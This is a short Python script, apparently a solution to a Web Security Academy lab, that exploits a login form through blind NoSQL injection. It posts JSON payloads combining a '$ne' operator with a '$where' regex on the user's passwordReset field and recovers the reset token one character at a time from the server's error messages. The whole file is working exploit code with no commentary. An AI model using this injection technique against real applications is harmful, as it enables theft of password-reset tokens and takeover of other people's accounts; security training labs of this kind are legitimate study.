import requests, string

quess = ''

url = 'https://0a030013040f09e187d8fcb0009f00b0.web-security-academy.net/login'
chars = string.ascii_letters + string.digits
searching = True


while searching:
        for char in chars:

            payload = f'{{"username":"carlos","password":{{"$ne":"invalid"}}, "$where":"this.passwordReset.match(/^{quess}{char}/)"}}'

            response = requests.post(url, data=payload, headers={'Content-Type': 'application/json'})


            if 'Invalid username or password' not in response.text:
                quess += char
                print("Current word: " + quess)
                break
        else:
            print("No more valid characters found")
            exit(1)